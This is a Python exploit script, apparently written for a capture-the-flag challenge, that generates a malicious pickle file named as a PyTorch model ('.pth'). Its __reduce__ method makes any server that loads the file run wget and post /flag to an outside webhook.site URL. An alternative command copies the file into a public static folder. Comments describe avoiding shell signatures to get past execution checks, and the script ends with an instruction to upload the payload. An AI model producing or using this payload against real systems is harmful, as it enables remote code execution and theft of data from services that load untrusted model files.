import pickle
import subprocess
import sys

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 

# LIST BASED COMMAND (No shell=True)
# This avoids 'sh' or 'cmd' signatures and might bypass "shell execution" checks.
# However, we can't use pipes or redirects easily.
# We will use 'wget' to exfiltrate.
cmd_list = ['wget', '--post-file=/flag', WEBHOOK_URL]

# Alternative: cp /flag
cmd_list_cp = ['cp', '/flag', '/app/static/flag.txt']

print(f"[*] Payload Logic: subprocess.run({cmd_list})")

class MaliciousModel(object):
    def __reduce__(self):
        # API: subprocess.run(args, ...)
        # We wrap it in a tuple to execute multiple commands? 
        # No, reduce returns one call.
        # We'll pick the exfiltration one.
        return (subprocess.run, (cmd_list,))

if __name__ == "__main__":
    output_file = "nailong_payload_v5.pth"
    with open(output_file, 'wb') as f:
        pickle.dump(MaliciousModel(), f)
    print(f"[+] Generated {output_file}")
    print("[!] Upload this file to the server.")
